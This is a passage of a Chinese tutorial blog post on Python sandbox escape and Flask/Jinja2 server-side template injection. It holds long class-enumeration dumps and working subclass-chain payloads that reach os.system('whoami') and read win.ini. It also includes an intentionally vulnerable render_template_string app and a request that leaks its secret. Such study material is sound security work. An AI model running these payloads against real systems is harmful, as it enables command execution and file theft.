+104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; eval
+104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; compile
+104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __import__
+104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open
+104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open
+105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec
+105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; eval
+105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; compile
+105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __import__
+105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open
+105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open
+106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec
+106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; eval
+106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; compile
+106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __import__
+106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open
+106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open
+128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec
+128 1 &lt;class &#39;os._wrap_close&#39;&gt; file
+128 1 &lt;class &#39;os._wrap_close&#39;&gt; open
+128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec
+128 7 &lt;class &#39;os._wrap_close&#39;&gt; eval
+128 7 &lt;class &#39;os._wrap_close&#39;&gt; compile
+128 7 &lt;class &#39;os._wrap_close&#39;&gt; __import__
+128 7 &lt;class &#39;os._wrap_close&#39;&gt; open
+128 11 &lt;class &#39;os._wrap_close&#39;&gt; open
+129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec
+129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; eval
+129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; compile
+129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __import__
+129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open
+130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec
+130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; eval
+130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; compile
+130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __import__
+130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open
+137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec
+137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; eval
+137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; compile
+137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __import__
+137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open
+138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec
+138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; eval
+138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; compile
+138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __import__
+138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open
+139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec
+139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; eval
+139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; compile
+139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; __import__
+139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open
+140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec
+140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; eval
+140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; compile
+140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; __import__
+140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open
+167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec
+167 7 &lt;class &#39;reprlib.Repr&#39;&gt; eval
+167 7 &lt;class &#39;reprlib.Repr&#39;&gt; compile
+167 7 &lt;class &#39;reprlib.Repr&#39;&gt; __import__
+167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open
+174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec
+174 7 &lt;class &#39;functools.partialmethod&#39;&gt; eval
+174 7 &lt;class &#39;functools.partialmethod&#39;&gt; compile
+174 7 &lt;class &#39;functools.partialmethod&#39;&gt; __import__
+174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open
+176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec
+176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; eval
+176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; compile
+176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __import__
+176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open
+177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec
+177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; eval
+177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; compile
+177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __import__
+177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open
+----------4-----------
+140 exec
+140 eval
+140 compile
+140 __import__
+140 open
+</code></pre><p>筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</p>
+<pre><code>----------2-----------                                      
+103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None           
+104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None           
+105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None           
+106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None                
+128 &lt;class &#39;os._wrap_close&#39;&gt; open None                      
+----------3-----------                                      
+75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open           
+75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec           
+76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open      
+76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec      
+77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open    
+77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec    
+78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open     
+78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec     
+79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open            
+79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec            
+91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open   
+91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec   
+92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open
+92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec
+93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open
+93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec
+95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open   
+95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec   
+103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open              
+103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec              
+103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open             
+104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open              
+104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec              
+104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open             
+105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open              
+105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec              
+105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open             
+106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                   
+106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec                   
+106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                  
+128 1 &lt;class &#39;os._wrap_close&#39;&gt; open                         
+128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec                         
+128 7 &lt;class &#39;os._wrap_close&#39;&gt; open                         
+128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec                         
+128 11 &lt;class &#39;os._wrap_close&#39;&gt; open                        
+129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open                  
+129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec                  
+130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open                 
+130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec                 
+137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open            
+137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec            
+138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open                
+138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec                
+139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open                
+139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec                
+140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open                
+140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec                
+167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open                           
+167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec                           
+174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open                
+174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec                
+176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open
+176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec
+177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open              
+177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec              
+----------4-----------                                      
+140 open                                                    
+140 exec                                                    
+</code></pre><p>既然筛选出来，那么选其中一个利用来读取文件：</p>
+<pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103]
+&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;
+</code></pre><p>完整执行</p>
+<pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;open&#39;](&quot;C:\\windows\\win.ini&quot;).read()
+&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCM
+C=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessaging=1\n[xianshuabao]\nclient_uuid={xxx}\n&#39;
+</code></pre><p>执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于<code>dict.values</code>不再返回列表，而是返回view，不可索引的对象。</p>
+<pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)
+misaki\user
+</code></pre><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p>python2.7的模块(252)</p>
+<pre><code>bsddb
+compiler
+ctypes
+curses
+......
+webbrowser.py
+whichdb.py
+wsgiref.egg-info
+xdrlib.py
+xmllib.py
+xmlrpclib.py
+zipfile.py
+</code></pre><p>同样利用原代码进行筛选</p>
+<pre><code>----------1-----------
+(40, &#39;file&#39;)
+----------2-----------
+(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])
+(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__builtins__&#39;, None)
+(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;sys&#39;, None)
+(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])
+(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])
+(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__builtins__&#39;, None)
+(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;sys&#39;, None)
+(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])
+(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__builtins__&#39;, None)
+(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__builtins__&#39;, None)
+(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;__builtins__&#39;, None)
+(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])
+(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])
+(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;sys&#39;, None)
+(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__builtins__&#39;, None)
+(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])
+(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])
+(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;sys&#39;, None)
+(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__builtins__&#39;, None)
+(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;sys&#39;, None)
+(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)
+(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__builtins__&#39;, None)
+(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;sys&#39;, None)
+(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)
+----------3-----------
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__import__&#39;)
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;compile&#39;)
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__import__&#39;)
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;compile&#39;)
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__import__&#39;)
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;compile&#39;)
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__import__&#39;)
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;compile&#39;)
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)
+(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)
+(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;__import__&#39;)
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;compile&#39;)
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)
+(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)
+(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__import__&#39;)
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;compile&#39;)
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)
+(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__import__&#39;)
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;compile&#39;)
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)
+(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__import__&#39;)
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;compile&#39;)
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)
+----------4-----------
+(60, &#39;__import__&#39;)
+(60, &#39;file&#39;)
+(60, &#39;repr&#39;)
+(60, &#39;compile&#39;)
+(60, &#39;eval&#39;)
+(60, &#39;open&#39;)
+(60, &#39;execfile&#39;)
+</code></pre><p>进一步获取可以直接执行命令或者读取文件的类</p>
+<pre><code>----------1-----------                                                                
+(40, &#39;file&#39;)                                                                          
+----------2-----------                                                                
+(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   
+(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    
+(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   
+(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    
+(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                   
+(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                  
+(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                    
+(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                   
+(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)                               
+(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)                               
+----------3-----------                                                                
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)                                   
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)                                   
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)                                   
+(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)                               
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)                                   
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)                                   
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)                                   
+(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)                               
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)                                
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)                                
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)                                
+(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)                            
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)                                        
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)                                        
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)                                        
+(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)                                    
+(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             
+(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)                                             
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)                                             
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)                                             
+(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)                                         
+(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              
+(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)                                              
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)                                              
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)                                              
+(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)                                          
+(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)                                 
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)                                 
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 
+(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)                             
+(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)                                 
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)                                 
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 
+(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)                             
+----------4-----------                                                                
+(60, &#39;file&#39;)                                                                          
+(60, &#39;repr&#39;)                                                                          
+(60, &#39;eval&#39;)                                                                          
+(60, &#39;open&#39;)                                                                          
+(60, &#39;execfile&#39;)                                                                      
+</code></pre><p>选取其中一个执行命令，<code>__mro__</code>输出父类，最后一个父类为object</p>
+<pre><code>&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72]
+&lt;class &#39;site._Printer&#39;&gt;
+
+&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)
+misaki\user
+</code></pre><p>读取文件</p>
+<pre><code>&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&quot;C:\\windows\\
+win.ini&quot;).read()
+&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCMC=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessagin
+</code></pre><p>其中还可以执行的模块还有很多，比如使用含有<code>__builtins__</code>的其他模块，来调用加载的os等。</p>
+<p>筛选代码来源：<a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">Python沙箱逃逸总结</a></p>
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>服务器端模板注入。既然谈到SSTI，在python中就要提一下flask，jinja2模板。此处利用网上一段代码</p>
+<pre><code>from flask import Flask
+from flask import request, render_template_string, render_template
+
+app = Flask(__name__)
+
+@app.route(&#39;/login&#39;)
+def hello_ssti():
+    person = {
+        &#39;name&#39;: &#39;hello&#39;,
+        &#39;secret&#39;: &#39;This_is_my_secret&#39;
+    }
+    if request.args.get(&#39;name&#39;):
+        person[&#39;name&#39;] = request.args.get(&#39;name&#39;)
+    template = &#39;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#39; % person[&#39;name&#39;]
+    return render_template_string(template, person=person)
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(debug=True)
+</code></pre><p>当如下请求的时候就会显示其他参数，比如secret</p>
+<pre><code>http://127.0.0.1:5000/login?name={{person[%27secret%27]}}
+</code></pre><p>其中的<code>render_template_string</code>和另一个模板函数<code>render_template</code>区别在第一个参数是否可以传入字符串，但是传入字符串就一定会有问题吗？修改template参数</p>
+<pre><code>from flask import Flask
+from flask import request, render_template_string
+
+app = Flask(__name__)
+
+@app.route(&#39;/login&#39;)
+def hello_ssti():
+    person = {
+        &#39;name&#39;: &#39;hello&#39;,
+        &#39;secret&#39;: &#39;This_is_my_secret&#39;
+    }
+    if request.args.get(&#39;name&#39;):
+        person[&#39;name&#39;] = request.args.get(&#39;name&#39;)
+    template = &#39;&lt;h2&gt;Hello {{person.name }}!&lt;/h2&gt;&#39;
+    return render_template_string(template, person=person)
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(debug=True)
+</code></pre><p>做如下请求的时候，就会显示<code>Hello {{person['secret']}}!</code>，我们传入的参数被当作字符串显示出来。</p>
+<pre><code>http://127.0.0.1:5000/login?name={{person[%27secret%27]}}
+</code></pre><p>name参数传入后，先修改person中的name值，person变成</p>
+<pre><code>person = {
+        &#39;name&#39;: &#39;{{person['secret']}}&#39;,
+        &#39;secret&#39;: &#39;This_is_my_secret&#39;
+    }
+</code></pre><p>后面调用模板，来执行的时候，根据变量取值，又把<code>person.name</code>获取出来，传入<code>render_template_string</code>的就是<code>&#39;&lt;h2&gt;Hello {{person.name}}!&lt;/h2&gt;&#39;</code>，取值后整体被当作字符串显示。这里跟上面格式化字符串的时候不一样的地方就出来了，当我们直接传入<code>{{person['secret']}}</code>的时候，调用模板变量取值的时候，先格式化字符串，把传入字符串当作变量来处理。也就是<code>&#39;&lt;h2&gt;Hello {{person['secret']}}!&lt;/h2&gt;&#39;</code>加载到<code>render_template_string</code>。这又涉及到python的字符串格式化。</p>
+<h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><p>在python中常见的字符串格式化有几种形式</p>
+<h4 id="操作符"><a href="#操作符" class="headerlink" title="%操作符"></a>%操作符</h4><pre><code>&gt;&gt;&gt; name = &quot;aaa&quot;
+&gt;&gt;&gt; &#39;%s&#39; %name
+&#39;aaa&#39;
